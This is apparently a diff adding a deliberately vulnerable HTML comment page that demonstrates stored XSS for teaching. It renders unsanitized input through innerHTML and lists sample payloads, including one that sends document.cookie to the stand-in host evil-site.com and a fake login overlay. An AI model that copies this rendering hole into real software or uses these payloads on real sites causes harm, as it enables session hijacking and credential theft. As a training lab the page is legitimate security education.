@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnerable Stored XSS Example</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .warning { background: #ffebee; border: 1px solid #f44336; padding: 15px; border-radius: 4px; margin-bottom: 20px; color: #c62828; }
+        .comment-form { background: #f9f9f9; padding: 20px; border-radius: 8px; margin: 20px 0; }
+        .comment-form input, .comment-form textarea { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        .comment-form button { padding: 10px 20px; background: #4caf50; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        .comments { margin-top: 30px; }
+        .comment { background: #fff; border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 4px; }
+        .comment-header { font-weight: bold; color: #2196f3; margin-bottom: 10px; }
+        .comment-time { color: #666; font-size: 0.9em; }
+        .payload-examples { background: #fff3e0; padding: 15px; border-radius: 4px; margin-top: 20px; }
+        .clear-btn { background: #f44336; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; margin-left: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚨 Vulnerable Comment System - Stored XSS</h1>
+        
+        <div class="warning">
+            <strong>Warning:</strong> This comment system is intentionally vulnerable!
+            <br>Comments are stored in localStorage and displayed without sanitization.
+        </div>
+
+        <div class="comment-form">
+            <h3>💬 Post a Comment</h3>
+            <input type="text" id="commentName" placeholder="Your name">
+            <textarea id="commentText" rows="4" placeholder="Write your comment here..."></textarea>
+            <button onclick="addComment()">Post Comment</button>
+            <button class="clear-btn" onclick="clearComments()">Clear All Comments</button>
+        </div>
+
+        <div class="payload-examples">
+            <h3>🔥 Try these Stored XSS payloads in the comment box:</h3>
+            
+            <p><strong>Persistent Alert:</strong></p>
+            <code>&lt;script&gt;alert('Stored XSS - This will execute every time page loads!')&lt;/script&gt;</code>
+            
+            <p><strong>Session Hijacker:</strong></p>
+            <code>&lt;script&gt;fetch('https://evil-site.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code>
+            
+            <p><strong>Keylogger:</strong></p>
+            <code>&lt;script&gt;document.addEventListener('keydown', function(e) { console.log('Key pressed: ' + e.key); });&lt;/script&gt;</code>
+            
+            <p><strong>Fake Login Form:</strong></p>
+            <code>&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;"&gt;&lt;div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border-radius:8px;"&gt;&lt;h3&gt;Session Expired - Please Login&lt;/h3&gt;&lt;input type="text" placeholder="Username"&gt;&lt;input type="password" placeholder="Password"&gt;&lt;button onclick="alert('Credentials stolen!')"&gt;Login&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;</code>
+            
+            <p><strong>Invisible Image with Payload:</strong></p>
+            <code>&lt;img src="x" onerror="alert('Hidden XSS payload executed!')" style="display:none"&gt;</code>
+        </div>
+
+        <div class="comments" id="commentsSection">
+            <h3>📝 Comments</h3>
+            <div id="commentsList"></div>
+        </div>
+
+        <div style="margin-top: 30px; padding: 15px; background: #e8f5e8; border-radius: 4px;">
+            <h3>🎯 Why is this dangerous?</h3>
+            <p>1. <strong>Persistent execution</strong>: Malicious scripts execute every time any user visits the page</p>
+            <p>2. <strong>No sanitization</strong>: Comments stored and displayed as raw HTML</p>
+            <p>3. <strong>Affects all users</strong>: Every visitor sees and executes the malicious code</p>
+            <p>4. <strong>Hard to detect</strong>: Payloads can be hidden or disguised as normal content</p>
+            <p>5. <strong>Persistent storage</strong>: Attacks remain even after browser restart</p>
+        </div>
+    </div>
+
+    <script>
+        // Load existing comments when page loads
+        window.onload = function() {
+            displayComments();
+        };
+
+        function addComment() {
+            const name = document.getElementById('commentName').value;
+            const text = document.getElementById('commentText').value;
+            
+            if (!name || !text) {
+                alert('Please fill in both name and comment!');
+                return;
+            }
+
+            // 🚨 VULNERABLE CODE - Never store user input like this!
+            const comment = {
+                name: name,
+                text: text,
+                timestamp: new Date().toLocaleString()
+            };
+
+            // Get existing comments from localStorage
+            let comments = JSON.parse(localStorage.getItem('comments')) || [];
+            comments.push(comment);
+            
+            // Store back to localStorage without any sanitization
+            localStorage.setItem('comments', JSON.stringify(comments));
+            
+            // Clear form
+            document.getElementById('commentName').value = '';
+            document.getElementById('commentText').value = '';
+            
+            // Refresh display
+            displayComments();
+            
+            console.log('🚨 Comment stored without sanitization:', comment);
+        }
+
+        function displayComments() {
+            const comments = JSON.parse(localStorage.getItem('comments')) || [];
+            const commentsList = document.getElementById('commentsList');
+            
+            if (comments.length === 0) {
+                commentsList.innerHTML = '<p><em>No comments yet. Be the first to comment!</em></p>';
+                return;
+            }
+            
+            // 🚨 VULNERABLE CODE - Direct innerHTML insertion without sanitization
+            let html = '';
+            comments.forEach((comment, index) => {
+                html += `
+                    <div class="comment">
+                        <div class="comment-header">
+                            ${comment.name} <span class="comment-time">(${comment.timestamp})</span>
+                        </div>
+                        <div class="comment-content">
+                            ${comment.text}
+                        </div>
+                    </div>
+                `;
+            });
+            
+            commentsList.innerHTML = html;
+            
+            console.log('🚨 Comments displayed without sanitization. XSS payloads will execute!');
+        }
+
+        function clearComments() {
+            localStorage.removeItem('comments');
+            displayComments();
+            console.log('🧹 All comments cleared from localStorage');
+        }
+
+        // Demo: Add some sample comments for demonstration
+        if (!localStorage.getItem('comments')) {
+            const sampleComments = [
+                {
+                    name: "John Doe",
+                    text: "Great article! Thanks for sharing.",
+                    timestamp: new Date().toLocaleString()
+                },
+                {
+                    name: "Jane Smith", 
+                    text: "Very informative content. Looking forward to more!",
+                    timestamp: new Date().toLocaleString()
+                }
+            ];
+            localStorage.setItem('comments', JSON.stringify(sampleComments));
+        }
+
+        console.log('💾 Using localStorage to simulate database storage');
+        console.log('⚠️  Try posting comments with the XSS payloads above!');
+        console.log('🔄 Refresh the page to see how stored XSS persists');
+    </script>
+</body>
+</html> 
